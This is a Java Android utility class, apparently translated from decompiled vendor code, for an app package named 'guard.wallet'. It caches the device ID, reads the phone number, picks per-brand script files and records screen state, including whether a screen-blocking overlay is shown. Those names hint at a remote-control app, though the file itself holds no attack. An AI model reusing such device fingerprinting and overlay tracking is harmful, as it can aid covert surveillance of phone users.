package com.guard.wallet.utils;

import com.guard.wallet.core.AppUtils;
import android.app.Activity;
import android.content.Context;
import android.content.res.Resources;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import androidx.core.content.ContextCompat;
import com.google.gson.Gson;
import com.guard.wallet.LockActivity;
import com.guard.wallet.activity.ConfirmDeviceActivity;
import com.guard.wallet.activity.NoDisplayActivity;
import com.guard.wallet.permission.PermissionManager;
import com.guard.wallet.req.ScreenMetricsVO;
import java.util.Locale;
import java.util.Objects;

/**
 * DeviceUtils — 设备信息工具类。
 * vendor utils/e.java (996行) 翻译。
 *
 * 字段:
 *   deviceIdCache (String) — 设备唯一 ID 缓存 (vendor: a)
 *   currentDisplayId (Integer) — 当前 Display ID (vendor: b)
 *
 * 方法:
 *   getBrandJsFileName() — 按品牌返回 JS 文件名 (vendor: a)
 *   getCurrentActivity() — 获取当前 Activity (vendor: b)
 *   getDeviceUniqueId() — 获取设备唯一 ID (ANDROID_ID) (vendor: c)
 *   getLanguageTag(Context) — 获取设备语言标签 (vendor: d)
 *   buildScreenMetrics() — 构建 ScreenMetricsVO（核心方法，495行）(vendor: e)
 *   extractLangPrefix(String) — 截取连字符前的字符串 (vendor: f)
 *   isHuaweiOrHonor() — 是否华为/荣耀/wiko 品牌 (vendor: g)
 *   isHarmonyOS() — 是否鸿蒙系统 (vendor: h)
 *   isOppoFamily() — 是否 OPPO/realme/oneplus 品牌 (vendor: i)
 *   isScreenOn() — 屏幕是否点亮 (isInteractive) (vendor: j)
 *   isTecnoFamily() — 是否传音系 (tecno/itel/infinix) (vendor: k)
 *   isVivoFamily() — 是否 vivo/iqoo 品牌 (vendor: l)
 *   isXiaomiFamily() — 是否小米系 (redmi/xiaomi/poco/blackshark) (vendor: m)
 *   getPhoneNumber() — 获取手机号码 (vendor: n)
 */
public abstract class DeviceUtils {

    /** 设备唯一 ID 缓存 (vendor: a) */
    public static String deviceIdCache;

    /** 当前 Display ID (vendor: b) */
    public static Integer currentDisplayId = 0;

    // ═══════ getBrandJsFileName() — 按品牌返回 JS 文件名 ═══════

    /** vendor e.a() — 根据 Build.BRAND 返回对应 JS 配置文件名 */
    public static String getBrandJsFileName() {
        String brand = Build.BRAND.toLowerCase();
        if (AppUtils.B(brand)) {
            return "android.js";
        }
        switch (brand) {
            case "blackshark": return "blackshark.js";
            case "oneplus":    return "oneplus.js";
            case "google":     return "google.js";
            case "huawei":     return "huawei.js";
            case "realme":     return "realme.js";
            case "xiaomi":     return "xiaomi.js";
            case "motorola":   return "motorola.js";
            case "iqoo":       return "iqoo.js";
            case "itel":       return "itel.js";
            case "oppo":       return "oppo.js";
            case "poco":       return "poco.js";
            case "sony":       return "sony.js";
            case "vivo":       return "vivo.js";
            case "wiko":       return "wiko.js";
            case "honor":      return "honor.js";
            case "meizu":      return "meizu.js";
            case "redmi":      return "redmi.js";
            case "tecno":      return "tecno.js";
            case "samsung":    return "samsung.js";
            case "infinix":    return "infinix.js";
            default:           return "android.js";
        }
    }

    // ═══════ getCurrentActivity() — 获取当前 Activity ═══════

    /**
     * vendor e.b() — 按优先级返回当前可用 Activity:
     * 1. PipActivityManager 的 PiP Activity
     * 2. LockActivity 单例
     * 3. ConfirmDeviceActivity 单例
     * 4. NoDisplayActivity 单例
     */
    public static Activity getCurrentActivity() {
        try {
            // vendor: e.b.a() — package 'e', class 'b', method a()
            // ADAPT: 用 PermissionManager 替代已删除的 PipActivityManager
            Activity pipActivity = PermissionManager.getActivity();
            if (pipActivity != null) {
                return pipActivity;
            }
            if (LockActivity.b() != null) {
                return LockActivity.b();
            }
            if (ConfirmDeviceActivity.getInstance() != null) {
                return ConfirmDeviceActivity.getInstance();
            }
            NoDisplayActivity nda;
            synchronized (NoDisplayActivity.class) {
                nda = NoDisplayActivity.instance;
            }
            if (nda != null) {
                synchronized (NoDisplayActivity.class) {
                    return NoDisplayActivity.instance;
                }
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    // ═══════ getDeviceUniqueId() — 获取设备唯一 ID ═══════

    /**
     * vendor e.c() — synchronized 获取设备唯一 ID:
     * 1. 先检查缓存 (field deviceIdCache)
     * 2. 再读 SharedPreferences "DEVICE_UNIQUE_ID"
     * 3. 最后用 ANDROID_ID 并保存
     */
    public static synchronized String getDeviceUniqueId() {
        synchronized (DeviceUtils.class) {
            if (deviceIdCache == null) {
                try {
                    if (SystemHelper.Z() != null) {
                        String cached = SharedPrefsManager.l("DEVICE_UNIQUE_ID");
                        deviceIdCache = cached;
                        if (cached == null) {
                            String androidId = Settings.Secure.getString(
                                SystemHelper.Z().getContentResolver(), "android_id");
                            deviceIdCache = androidId;
                            SharedPrefsManager.D(androidId, "DEVICE_UNIQUE_ID");
                        }
                    }
                } catch (Exception ex) {
                    AppUtils.s("DeviceUtils", ex);
                }
            }
            return deviceIdCache;
        }
    }

    // ═══════ getLanguageTag(Context) — 获取设备语言标签 ═══════

    /**
     * vendor e.d(Context) — 获取设备 Locale 的语言标签。
     * 优先 toLanguageTag()，若为空则 getLanguage()。
     */
    public static String getLanguageTag(Context context) {
        if (context == null) {
            return null;
        }
        try {
            if (context.getResources() == null
                || context.getResources().getConfiguration() == null) {
                return null;
            }
            Locale locale = context.getResources().getConfiguration().locale;
            if (locale == null) {
                return null;
            }
            return !AppUtils.B(locale.toLanguageTag())
                ? locale.toLanguageTag()
                : locale.getLanguage();
        } catch (Exception ex) {
            AppUtils.s("DeviceUtils", ex);
            return null;
        }
    }

    // ═══════ buildScreenMetrics() — 构建 ScreenMetricsVO（核心方法） ═══════

    /**
     * vendor e.e() — 构建完整 ScreenMetricsVO。
     *
     * 当 Activity 可用时直接从 DisplayMetrics 读取：
     *   width, height, density, scaledDensity, xdpi, ydpi,
     *   statusBarHeight, navigationBarHeight, isScreenRound
     *
     * 当 Activity 不可用时从 SharedPreferences ("screenMetrics") 反序列化缓存。
     *
     * 然后补充运行时状态：
     *   state (screenState), isScreenOn, isBlocked, screenOffTimeout
     *
     * 最后序列化回 SharedPreferences 并返回。
     */
    public static ScreenMetricsVO buildScreenMetrics() {
        ScreenMetricsVO vo = new ScreenMetricsVO();
        try {
            Activity activity = getCurrentActivity();

            ScreenMetricsVO result;
            if (activity != null) {
                // --- 有 Activity：从 Display 读取 ---
                try {
                    currentDisplayId = activity.getWindowManager().getDefaultDisplay().getDisplayId();
                } catch (Exception ex) {
                    AppUtils.s("DeviceUtils", ex);
                }

                try {
                    DisplayMetrics dm = new DisplayMetrics();
                    activity.getWindowManager().getDefaultDisplay().getRealMetrics(dm);
                    vo.setWidth(dm.widthPixels);
                    vo.setHeight(dm.heightPixels);
                    vo.setDensity(dm.densityDpi);
                    vo.setScaledDensity(dm.scaledDensity);
                    vo.setXdpi(dm.xdpi);
                    vo.setYdpi(dm.ydpi);
                } catch (Exception ex) {
                    AppUtils.s("DeviceUtils", ex);
                }

                // StatusBar 高度
                int statusBarHeight = 0;
                try {
                    Activity act = getCurrentActivity();
                    if (act != null) {
                        int resId = act.getResources().getIdentifier(
                            "status_bar_height", "dimen", "android");
                        if (resId > 0) {
                            statusBarHeight = act.getResources().getDimensionPixelSize(resId);
                        }
                    }
                } catch (Exception ex) {
                    AppUtils.s("DeviceUtils", ex);
                }
                vo.setStatusBarHeight(statusBarHeight);

                // NavigationBar 高度
                int navBarHeight = 0;
                try {
                    Activity act = getCurrentActivity();
                    if (act != null) {
                        int resId = act.getResources().getIdentifier(
                            "navigation_bar_height", "dimen", "android");
                        if (resId > 0) {
                            navBarHeight = act.getResources().getDimensionPixelSize(resId);
                        }
                    }
                } catch (Exception ex) {
                    AppUtils.s("DeviceUtils", ex);
                }
                vo.setNavigationBarHeight(navBarHeight);

                // isScreenRound: vendor 用 width/height > 0.5 判断（非 Configuration.isScreenRound）
                try {
                    boolean ratio = (float) vo.getWidth().intValue()
                        / (float) vo.getHeight().intValue() > 0.5f;
                    vo.setIsScreenRound(ratio ? 1 : 0);
                } catch (Exception ex) {
                    AppUtils.s("DeviceUtils", ex);
                }

                result = vo;
            } else {
                // --- 无 Activity：从缓存恢复 ---
                String cached = SharedPrefsManager.l("screenMetrics");
                if (!AppUtils.B(cached)) {
                    try {
                        result = new Gson().fromJson(cached, ScreenMetricsVO.class);
                    } catch (Exception ex) {
                        AppUtils.s("DeviceUtils", ex);
                        result = vo;
                    }
                } else {
                    result = vo;
                }
            }

            // --- 补充运行时状态 ---

            // screenState 从 SharedPreferences
            result.setState(SharedPrefsManager.i("screenState"));

            // isScreenOn + state 联动
            if (isScreenOn()) {
                // 屏幕亮
                result.setIsScreenOn(1);
                if (Objects.equals(result.getState(), 0)) {
                    // state=0 (OFF) 但屏幕亮 → 修正为 1 (ON)
                    result.setState(1);
                }
            } else {
                // 屏幕灭
                result.setIsScreenOn(0);
                if (!Objects.equals(result.getState(), 0)
                    && !Objects.equals(result.getState(), 3)) {
                    // state 不是 OFF(0) 也不是 DOZE(3) → 修正为 0 (OFF)
                    result.setState(0);
                }
            }

            // isBlocked (BlockView 遮罩状态)
            result.setIsBlocked(com.guard.wallet.helper.BlockViewManager.g() ? 1 : 0);

            // screenOffTimeout
            result.setScreenOffTimeout(SystemHelper.P0());

            // 缓存到 SharedPreferences
            SharedPrefsManager.D(SharedPrefsManager.N(result), "screenMetrics");

            return result;
        } catch (Exception ex) {
            AppUtils.s("DeviceUtils", ex);
            return vo;
        }
    }

    // ═══════ extractLangPrefix(String) — 截取连字符前的字符串 ═══════

    /** vendor e.f(String) — 截取 "-" 之前的部分（例如 "zh-CN" → "zh"） */
    public static String extractLangPrefix(String str) {
        if (AppUtils.B(str) || !str.contains("-")) {
            return str;
        }
        String[] parts = str.split("-");
        return parts.length > 1 ? parts[0] : str;
    }

    // ═══════ isHuaweiOrHonor() — 是否华为/荣耀/wiko ═══════

    /** vendor e.g() — 判断是否华为系品牌 (huawei/honor/wiko) */
    public static boolean isHuaweiOrHonor() {
        String brand = Build.BRAND;
        return brand.equalsIgnoreCase("huawei")
            || brand.equalsIgnoreCase("honor")
            || brand.equalsIgnoreCase("wiko");
    }

    // ═══════ isHarmonyOS() — 是否鸿蒙系统 ═══════

    /** vendor e.h() — 判断是否鸿蒙系统 (config_os_brand 含 "harmony") */
    public static boolean isHarmonyOS() {
        if (SystemHelper.Z() == null || !isHuaweiOrHonor()) {
            return false;
        }
        try {
            int resId = Resources.getSystem().getIdentifier(
                "config_os_brand", "string", "android");
            String osBrand = SystemHelper.Z().getString(resId);
            if (AppUtils.B(osBrand)) {
                return false;
            }
            return osBrand.toLowerCase().contains("harmony");
        } catch (Exception ex) {
            AppUtils.s("DeviceUtils", ex);
            return false;
        }
    }

    // ═══════ isOppoFamily() — 是否 OPPO 系 ═══════

    /** vendor e.i() — 判断是否 OPPO 系品牌 (oppo/realme/oneplus) */
    public static boolean isOppoFamily() {
        String brand = Build.BRAND;
        return brand.equalsIgnoreCase("oppo")
            || brand.equalsIgnoreCase("realme")
            || brand.equalsIgnoreCase("oneplus");
    }

    // ═══════ isScreenOn() — 屏幕是否点亮 ═══════

    /** vendor e.j() — 通过 PowerManager.isInteractive() 判断屏幕是否点亮 */
    public static boolean isScreenOn() {
        Context ctx = SystemHelper.Z();
        if (ctx == null) {
            return false;
        }
        try {
            return ((PowerManager) ctx.getSystemService("power")).isInteractive();
        } catch (Exception ex) {
            AppUtils.s("DeviceUtils", ex);
            return false;
        }
    }

    // ═══════ isTecnoFamily() — 是否传音系 ═══════

    /** vendor e.k() — 判断是否传音系品牌 (tecno/itel/infinix) */
    public static boolean isTecnoFamily() {
        String brand = Build.BRAND;
        return brand.equalsIgnoreCase("tecno")
            || brand.equalsIgnoreCase("itel")
            || brand.equalsIgnoreCase("infinix");
    }

    // ═══════ isVivoFamily() — 是否 vivo 系 ═══════

    /** vendor e.l() — 判断是否 vivo 系品牌 (vivo/iqoo) */
    public static boolean isVivoFamily() {
        String brand = Build.BRAND;
        return brand.equalsIgnoreCase("vivo")
            || brand.equalsIgnoreCase("iqoo");
    }

    // ═══════ isXiaomiFamily() — 是否小米系 ═══════

    /** vendor e.m() — 判断是否小米系品牌 (redmi/xiaomi/poco/blackshark) */
    public static boolean isXiaomiFamily() {
        String brand = Build.BRAND;
        return brand.equalsIgnoreCase("redmi")
            || brand.equalsIgnoreCase("xiaomi")
            || brand.equalsIgnoreCase("poco")
            || brand.equalsIgnoreCase("blackshark");
    }

    // ═══════ getPhoneNumber() — 获取手机号码 ═══════

    /**
     * vendor e.n() — 获取手机号码 (TelephonyManager.getLine1Number)。
     * 需要 READ_PHONE_STATE 权限。
     */
    public static String getPhoneNumber() {
        if (SystemHelper.Z() == null) {
            return null;
        }
        try {
            TelephonyManager tm = (TelephonyManager) SystemHelper.Z().getSystemService("phone");
            if (tm == null
                || ContextCompat.checkSelfPermission(SystemHelper.Z(),
                    "android.permission.READ_PHONE_STATE") != 0) {
                return null;
            }
            return tm.getLine1Number();
        } catch (Exception ex) {
            AppUtils.s("DeviceUtils", ex);
            return null;
        }
    }
}
